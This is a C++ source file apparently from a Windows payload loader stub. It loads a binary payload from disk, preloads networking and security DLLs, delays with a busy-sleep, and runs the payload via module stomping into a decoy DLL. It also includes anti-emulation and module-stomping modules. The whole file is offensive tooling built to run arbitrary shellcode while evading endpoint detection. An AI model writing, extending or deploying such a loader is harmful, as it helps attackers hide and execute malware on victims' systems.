#include "loader_stub.h"
#include "../utils/logging.h"
#include "../config.h"
#include "../modules/module_stomping.h"
#include "../modules/anti_emulation.h"
#include <windows.h>
#include <vector>
#include <stdio.h>
#include <fstream>




namespace LoaderStub {


    /*===============================================[Get Payload locally]========================================================================*/
    
    // Load payload from disk
    std::vector<uint8_t> LoadBinaryFile(const std::string& path) {
		std::ifstream
			file(path
				, std::ios::binary | std::ios::ate);
		if (!file.is_open()) {
            Log::Write(Log::LogLevel::Error, "Failed to open payload file: " + path);
            return {};
		}
		std::streamsize size = file.tellg();
		file.seekg(0, std::ios::beg);
		std::vector<uint8_t> buffer(size);
        if (!file.read((char*)buffer.data(), size)) {
            Log::Write(Log::LogLevel::Error, "Failed to read payload file: " + path);
            return {};
		}
		return buffer;
	}

    /*=================================================[Preload DLLs]======================================================*/
    void PreloadDLLs() {
        Log::Write(Log::LogLevel::Msg, "Preloading DLLs...");
        // List of common DLLs to preload
        const char* dllsToPreload[] = {
            "kernel32.dll",
            "user32.dll",
            "advapi32.dll",
            "ntdll.dll",
            "wininet.dll",
            "winhttp.dll",
            "ws2_32.dll",
            "iphlpapi.dll",
            "secur32.dll",
            "netapi32.dll",
            "dnsapi.dll"

        };
        for (const char* dllName : dllsToPreload) {
            HMODULE hMod = LoadLibraryA(dllName);
            if (hMod) {
                Log::Write(Log::LogLevel::Msg, std::string("Preloaded: ") + dllName);
            } else {
                Log::Write(Log::LogLevel::Warn, std::string("Failed to preload: ") + dllName);
            }
        }
	}

	/*=======================================================[Execute]==================================================================*/

	// Execute payload
    void Execute(std::vector<uint8_t>& payload) {
        if (payload.empty()) {
            Log::Write(Log::LogLevel::Msg, "Payload is empty, skipping execution");
            return;
        }

		BusySleepMs(1000); // Simulate some delay

		// Preload DLLs
		PreloadDLLs();

		// Use module stomping to execute payload
        Module_Stomping::PatchSectionAndExecute(DECOY_DLL_PATH, payload);

        // If the payload ever returns
        Log::Write(Log::LogLevel::Msg, "Returned from payload execution");
    }
}